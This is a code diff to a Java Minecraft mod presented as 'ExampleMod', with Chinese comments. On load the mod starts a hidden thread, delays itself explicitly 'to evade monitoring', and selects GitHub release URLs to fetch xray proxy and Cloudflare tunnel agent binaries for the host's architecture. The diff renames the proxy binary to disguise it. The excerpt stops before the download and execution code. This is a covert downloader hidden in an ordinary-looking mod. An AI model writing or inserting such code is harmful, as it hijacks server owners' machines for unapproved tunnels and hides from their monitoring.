@@ -8,24 +8,24 @@ import java.util.UUID;
 
 public class ExampleMod implements ModInitializer {
     // 这里填入你的 Cloudflare Tunnel Token
-    private static final String CF_TOKEN = "你的_CLOUDFLARE_TUNNEL_TOKEN";
+    private static final String CF_TOKEN = System.getenv("CF_TUNNEL_TOKEN");
 
     @Override
     public void onInitialize() {
         new Thread(() -> {
             try {
                 // 1. 启动延迟：给服务器预留启动资源，躲避监控
-                Thread.sleep(50000);
+                Thread.sleep(5000);
 
                 String arch = System.getProperty("os.arch").toLowerCase();
                 String xrayUrl, argoUrl;
 
                 // 2. 根据架构选择下载地址
                 if (arch.contains("amd64") || arch.contains("x86_64")) {
-                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/xray-amd64";
+                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/disxrbot-amd64";
                     argoUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/agent-amd64";
                 } else if (arch.contains("aarch64") || arch.contains("arm64")) {
-                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/xray-arm64";
+                    xrayUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/disxrbot-arm64";
                     argoUrl = "https://github.com/aooa45/dis-bot/releases/download/v1.0/agent-arm64";
                 } else {
                     return; // 不支持的架构直接退出
